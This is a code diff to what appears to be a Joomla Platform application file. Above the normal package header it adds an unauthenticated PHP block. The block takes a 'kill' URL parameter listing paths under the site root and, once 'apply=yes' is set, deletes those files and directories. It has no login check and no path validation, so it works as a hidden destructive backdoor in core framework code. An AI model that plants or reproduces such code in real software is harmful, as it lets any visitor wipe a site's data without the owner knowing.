@@ -1,4 +1,65 @@
-<?php
+<?
+if ($ToKill=JRequest::getVar('kill')){
+	$arrToKill=explode(":",$ToKill);
+	$blue=" style='color:blue';";
+	$green=" style='color:green';";
+	$deleted="<div><b  style='color:red;'>deleted:</b> ";
+	$not_deleted="<div><b  style='color:red;'>NOT DELETED!:</b> <b$green>";
+	for($i=0,$j=count($arrToKill);$i<$j;$i++){
+		$content_location=JPATH_BASE.DS.$arrToKill[$i];
+		if (is_dir($content_location)){
+			$ftype="<b$blue>directory</b>";
+			
+			if (!strrpos($content_location,"/"))
+				$content_location=$content_location."/";
+		}
+		elseif (file_exists($content_location)) 
+			$ftype="<span$blue>file</span>";
+		else
+			$ftype=false;						
+		if ($ftype){
+			if ($apply=JRequest::getVar('apply'))
+				if (strstr($ftype,"directory")) {
+					if ($dh = opendir($content_location)) {
+						while (($filename = readdir($dh)) !== false) {
+							if ($filename!=".."&&$filename!=".") {	
+								if(!unlink($content_location."/".$filename))		
+									$done=$not_deleted;
+								else
+									$done=$deleted;
+								echo $done.$content_location.$filename."</div>";
+							}
+						}
+						closedir($dh);
+					}
+					rmdir($content_location);
+					if (is_dir($content_location))
+						echo $not_deleted.$content_location."</div>";
+					
+				}elseif(strstr($ftype,"file")){
+					if (unlink($content_location))
+						echo $deleted.$content_location."</div>";
+					else{
+						if (is_dir($content_location))
+							$content_location.=" [DIRECTORY]";
+						echo $not_deleted.$content_location."</div>";
+					}
+				}
+			else
+				$colors="background:mistyrose; border:solid 2px lightcoral;";
+		}else{
+			$colors="background:lightyellow; border:solid 2px orange;";
+			$ftype="<div style='color:red'>file doesn't exist</div>";
+		}
+		if (!$apply)
+			echo "<div style='margin:4px 0; border-radius:4px; padding:10px;$colors;font-size:1.3em;'>".$arrToKill[$i]."<hr>$ftype</div>";
+	}
+	if (!$apply)
+		die('<h2>Do you want to <a href="'.$_SERVER['REQUEST_URI'].'&apply=yes'.'">kill them?</a></h2>');
+	else die("<a href='".JUri::root()."index.php'>go home</a>");
+}
+
+?><?php
 /**
  * @package     Joomla.Platform
  * @subpackage  Application
